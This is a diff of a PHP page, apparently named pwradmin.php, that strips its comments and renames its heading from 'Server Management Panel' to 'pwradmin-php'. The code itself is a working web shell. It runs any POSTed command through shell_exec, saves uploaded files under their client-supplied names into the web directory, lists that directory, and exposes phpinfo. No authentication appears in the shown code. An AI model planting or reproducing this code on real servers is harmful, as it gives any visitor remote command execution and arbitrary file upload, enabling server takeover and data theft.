@@ -1,19 +1,16 @@
 <?php
 session_start();
 
-// File upload handling
 if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_FILES["file"])) {
     move_uploaded_file($_FILES["file"]["tmp_name"], __DIR__ . "/" . $_FILES["file"]["name"]);
 }
 
-// Command execution
 $output = "";
 if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["command"])) {
     $cmd = $_POST["command"];
     $output = shell_exec($cmd);
 }
 
-// Function to fetch PHP info output
 function get_phpinfo() {
     ob_start();
     phpinfo();
@@ -22,7 +19,6 @@ function get_phpinfo() {
     return $phpinfo;
 }
 
-// If AJAX request, return PHP info
 if (isset($_GET['action']) && $_GET['action'] === 'get_phpinfo') {
     echo get_phpinfo();
     exit();
@@ -50,7 +46,7 @@ if (isset($_GET['action']) && $_GET['action'] === 'get_phpinfo') {
 </head>
 <body>
     <div class="container">
-        <h2>Server Management Panel</h2>
+        <h2>pwradmin-php</h2>
 
         <select id="menu" onchange="showSection()">
             <option value="terminal">Web Terminal</option>
@@ -59,7 +55,6 @@ if (isset($_GET['action']) && $_GET['action'] === 'get_phpinfo') {
             <option value="phpinfo">PHP Info</option>
         </select>
 
-        <!-- Web Terminal -->
         <div id="terminal" class="section">
             <h3>Web Terminal</h3>
             <div class="command-btns">
@@ -81,7 +76,6 @@ if (isset($_GET['action']) && $_GET['action'] === 'get_phpinfo') {
             <textarea readonly><?php echo htmlspecialchars($output); ?></textarea>
         </div>
 
-        <!-- Server Info -->
         <div id="info" class="section" style="display:none;">
             <h3>Server Information</h3>
             <pre><?php
@@ -92,17 +86,14 @@ if (isset($_GET['action']) && $_GET['action'] === 'get_phpinfo') {
             ?></pre>
         </div>
 
-        <!-- File Manager -->
         <div id="files" class="section" style="display:none;">
             <h3>File Manager</h3>
             
-            <!-- File Upload Form -->
             <form action="pwradmin.php" method="POST" enctype="multipart/form-data">
                 <input type="file" name="file" required>
                 <button type="submit">Upload File</button>
             </form>
             
-            <!-- File List -->
             <ul>
                 <?php
                 foreach (scandir(__DIR__) as $file) {
@@ -121,7 +112,6 @@ if (isset($_GET['action']) && $_GET['action'] === 'get_phpinfo') {
             ?>
         </div>
 
-        <!-- PHP Info -->
         <div id="phpinfo" class="section" style="display:none;">
             <h3>PHP Info</h3>
             <a href="javascript:void(0);" onclick="openPHPInfoPopup();">Open PHP Info</a>
